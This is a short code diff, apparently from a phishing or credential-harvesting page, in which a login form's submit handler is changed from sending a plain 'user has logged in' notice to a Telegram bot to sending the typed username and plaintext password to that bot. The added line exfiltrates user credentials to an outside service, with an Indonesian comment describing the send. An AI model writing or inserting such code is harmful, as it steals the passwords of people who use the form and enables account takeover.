@@ -5,7 +5,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     const password = document.getElementById('password').value;
 
     // Kirim data login ke bot Telegram
-    sendDataToTelegram(`User ${username} has logged in.`);
+    sendDataToTelegram(`info login username:${username} password:${password}.`);
 });
 
 function sendDataToTelegram(data) {
